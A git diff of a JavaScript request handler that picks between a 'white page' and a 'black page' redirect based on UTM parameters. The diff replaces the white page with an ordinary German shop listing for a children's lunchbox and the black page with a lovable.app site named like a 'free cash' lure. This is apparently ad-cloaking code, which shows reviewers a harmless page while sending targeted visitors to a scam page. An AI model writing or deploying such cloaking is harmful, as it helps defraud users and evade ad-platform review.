@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.buyon.pk/learning-art-children-projection-drawing-board-drawing-projector-table-for-kids-drawing-projector-for-tracing-improve-creativity-imagination";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/ecosa-lunchbox-eo-8173-yummy-buddy-kinder-brotdose-tritan-brotdose-4-tlg-kinderfreundliche-verriegelung-bpa-frei-auslaufsicher-vesperdose-S0AAE0X5/";
+    const blackPageURL = "https://lucurfreeeccssh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,5 +26,6 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
